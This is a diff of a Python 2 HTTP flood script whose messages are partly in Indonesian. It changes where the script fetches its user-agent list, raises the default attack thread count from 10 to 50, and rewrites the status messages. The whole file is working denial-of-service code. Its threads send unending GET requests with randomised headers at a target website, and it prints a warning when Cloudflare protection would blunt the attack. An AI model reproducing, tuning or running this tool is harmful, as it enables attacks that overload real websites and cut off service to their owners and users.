@@ -1,7 +1,7 @@
 import requests,random,sys,time,os,base64,readline
 from thread import *
 os.system("clear")
-heder = requests.get("https://justaserverscript.000webhostapp.com/user-agents.txt").text
+heder = requests.get("https://raw.githubusercontent.com/tampansky/visitor/master/user-age.txt").text
 heder = heder.split("\n")
 h = '\033[92m'
 p = '\033[97m'
@@ -25,7 +25,7 @@ except:
    print ("Website not found or Connection Failed,aborting")
    sys.exit()
 
-thr = int(raw_input("Speed (normal : 10) : "))
+thr = int(raw_input("Speed (normal : 50) : "))
 def atk(proto):
 
     while True:
@@ -34,7 +34,7 @@ def atk(proto):
       try:
 	a = requests.get(proto,headers = {'User-Agent': rand})
 	if (str(a)) == "<Response [200]>":
-	   print ("[SUCCESS] " + str(time.localtime()[3]) + ":" + str(time.localtime()[4]) + ":" + str(time.localtime()[5]) + " Tunggu Sampai Ngelag... ")
+	   print ("[" + str(time.localtime()[3]) + ":" + str(time.localtime()[4]) + ":" + str(time.localtime()[5]) + "] Berhasil Mengirim Bot... ")
 	else:
 	   print ("This Website Is Protected By Cloudflare, This Attack Will Give No Effect")
       except requests.exceptions.ConnectionError:
@@ -54,7 +54,7 @@ def lol(bi):
   while True:
    for i in range(thr):
     start_new_thread(atk,(ip,))
-    print ("Menghubungkan...")
+    print ("["+ str(time.localtime()[3]) + ":" + str(time.localtime()[4]) + ":" + str(time.localtime()[5]) +"] Thread ...")
     time.sleep(1.5)
    print ("Thread Already Full,Restarting")
    time.sleep(2)
